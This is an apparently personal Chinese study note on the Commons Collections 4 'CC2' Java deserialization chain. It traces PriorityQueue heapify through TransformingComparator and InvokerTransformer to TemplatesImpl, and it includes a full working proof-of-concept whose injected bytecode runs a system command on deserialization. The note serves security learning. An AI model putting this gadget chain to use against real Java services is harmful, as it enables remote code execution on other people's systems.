---
title: CC2链分析
description: Commons Collections 4 PriorityQueue + TransformingComparator 反序列化链，通过 InvokerTransformer 调用 TemplatesImpl.newTransformer()
tags: [cc2, commons-collections4, deserialization, priorityqueue]
status: 已完成
finish-date: 2026-05-25
difficulty: 困难
---

# CC2链
## 核心：
利用 PriorityQueue 反序列化时的 heapify 建堆过程，触发 TransformingComparator 的比较操作，进而调用 InvokerTransformer 反射执行 TemplatesImpl.newTransformer()，最终通过 defineTransletClasses 加载恶意字节码触发静态代码块执行。
## 调用链
```java
PriorityQueue.readObject()                    // 入口：反序列化时自动调用
    ↓
heapify()                                      // 建堆过程
    ↓
siftDown()                                     // 堆化调整
    ↓
TransformingComparator.compare()               // 跳板：触发transform
    ↓
InvokerTransformer.transform()                 // 反射调用
    ↓
TemplatesImpl.newTransformer()                 // 加载恶意字节码
    ↓
defineTransletClasses()                        // 类加载
    ↓
恶意类的静态代码块 / 构造方法 → RCE
``` 
## 调用方法源码
1. PriorityQueue.readObject()
    ```java
    private void readObject(java.io.ObjectInputStream s) {
        s.defaultReadObject();
        s.readInt();  // 读取并丢弃数组长度
        queue = new Object[size];
        for (int i = 0; i < size; i++)
        queue[i] = s.readObject();  // 恢复元素
        heapify();  // ⚡关键：建堆触发比较
    }
    ```
    Queue 这个类，应该是实现队列的类，一个队列里可能会存有多个字节流对象，因此后面的 for 循环遍历这个队列，对队列中的每个对象进行反序列化操作。
    调用heapify方法
2. PriorityQueue.heapify()
    ```java
    private void heapify() {
        // 从最后一个非叶子节点开始，向下调整
        for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
    }
    ```  
    heapify 方法，会将 queue 中的对象传入 siftDown 方法中
3. PriorityQueue.siftDown()
    ```java
    private void siftDown(int k, E x) {
        // 判断是否使用比较器
        if (comparator != null)
        siftDownUsingComparator(k, x);  // 🔥 有比较器，进入这里
        else
        siftDownComparable(k, x);
    }
    ``` 
    PriorityQueue 这个类，我们在当初构造 payload 时，就已经进行了初始化 comparator 的操作了，因此我们这里会进入 siftDownUsingComparator 方法
4. PriorityQueue.siftDownUsingComparator()
    ```java
    private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        
        // 使用比较器比较子节点
        if (right < size && comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
        
        // 🔥 关键：使用比较器比较父节点和子节点
        if (comparator.compare(x, (E) c) <= 0)
                break;
        
        queue[k] = c;
        k = child;
        }
        queue[k] = x;
    }
    ``` 
    调用 comparator.compare 方法了，这就将 TransformingComparator 类链接起来，我们继续查看 TransformingComparator 的对应方法
5. TransformingComparator.compare()
    ```java
    public class TransformingComparator<I, O> implements Comparator<I>, Serializable {
        
        private final Transformer<? super I, ? extends O> transformer;
        private final Comparator<O> decorated;
        
        public TransformingComparator(Transformer<? super I, ? extends O> transformer) {
        this(transformer, Comparator.naturalOrder());
        }
        
        public TransformingComparator(Transformer<? super I, ? extends O> transformer,
                                    Comparator<O> decorated) {
        this.transformer = transformer;
        this.decorated = decorated;
        }
        
        @Override
        public int compare(final I obj1, final I obj2) {
        // 🔥 关键：比较时先对两个对象应用 Transformer
        final O value1 = this.transformer.transform(obj1);
        final O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
        }
    }
    ``` 
    compare() 方法会在每次比较时调用 transformer.transform()
    PriorityQueue 在 heapify() 和 add() 时都会触发比较操作
    这就是为什么 PriorityQueue 能成为入口的根本原因
6. InvokerTransformer.transform()
    ```java
    @Override
        public O transform(final Object input) {
        if (input == null) {
                return null;
        }
        try {
                // 🔥 关键：反射调用指定方法
                final Class<?> cls = input.getClass();
                final Method method = cls.getMethod(methodName, paramTypes);
                return (O) method.invoke(input, args);
        } catch (final NoSuchMethodException | IllegalAccessException | 
                        InvocationTargetException ex) {
                throw new FunctorException("InvokerTransformer: The method '" + 
                    methodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
        }
    ``` 
    InvokerTransformer.transform()可以反射调用任意方法，所以可以通过它调用TemplatesImpl.newTransformer(),后面就和CC3一样了
## 手工编写POC
1. 关键点构造PriorityQueue时comparator一个先放一个无害的TransformerComparator，然后再反射修改，因为将TemplatesImpl对象放入队列时的add()方法也会触发TransformerComparator.compare()
2. 完整POC
   ```java
   package com.example;

   import com.sun.org.apache.xalan.internal.xsltc.DOM;
   import com.sun.org.apache.xalan.internal.xsltc.TransletException;
   import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
   import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
   import javassist.ClassClassPath;
   import javassist.ClassPool;
   import javassist.CtClass;
   import org.apache.commons.collections4.comparators.TransformingComparator;
   import org.apache.commons.collections4.functors.InvokerTransformer;
   import org.apache.commons.collections4.functors.ConstantTransformer;
   import org.apache.commons.collections4.Transformer;
   import java.io.*;
   import java.util.PriorityQueue;
   import java.lang.reflect.Field;

   public class CC2Poc {
      public static void main(String[] args) throws Exception {
         ClassPool pool=ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
         CtClass cc=pool.makeClass("Evil");
         String cmd="java.lang.Runtime.getRuntime().exec(\"calc\");";
         cc.makeClassInitializer().insertBefore(cmd);
         cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
         String rename="Evil"+System.nanoTime();
         cc.setName(rename);
         byte[] bytes=cc.toBytecode();
         byte[][] target=new byte[][]{bytes};

         TemplatesImpl templates=new TemplatesImpl();
         Field bytecodes=templates.getClass().getDeclaredField("_bytecodes");
         bytecodes.setAccessible(true);
         bytecodes.set(templates,target);

         Field name=templates.getClass().getDeclaredField("_name");
         name.setAccessible(true);
         name.set(templates,"Poc");

         Field tfactory=templates.getClass().getDeclaredField("_tfactory");
         tfactory.setAccessible(true);

         InvokerTransformer it=new InvokerTransformer("newTransformer",new Class[0],new Object[0]);

         TransformingComparator tc =new TransformingComparator<>(it);

         PriorityQueue pq=new PriorityQueue<>(new TransformingComparator<>(new ConstantTransformer(1)));
         pq.add(templates);
         pq.add(templates);

         Field f=pq.getClass().getDeclaredField("comparator");
         f.setAccessible(true);
         f.set(pq,tc);


         ByteArrayOutputStream baos=new ByteArrayOutputStream();
         ObjectOutputStream oos=new ObjectOutputStream(baos);
         oos.writeObject(pq);
         oos.close();
         System.out.println("Serialized payload length: " + baos.size());

         ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
         ObjectInputStream ois=new ObjectInputStream(bais);
         ois.readObject();  
         ois.close();

         System.out.println("Done");
      }
   }
   ``` 
3. 测试，成功弹出计算器
![](java-deserialization(ing)/2026-05-24-15-49-29.png) 
## 调试观察方法调用
![](java-deserialization(ing)/2026-05-25-15-35-38.png) 
## 验证ysoserial工具生成的payload 
使用ysoserial生成payload文件 
![](java-deserialization(ing)/2026-05-25-12-00-10.png)
验证payload能够触发反序列化，执行命令 
![](java-deserialization(ing)/2026-05-25-11-59-21.png) 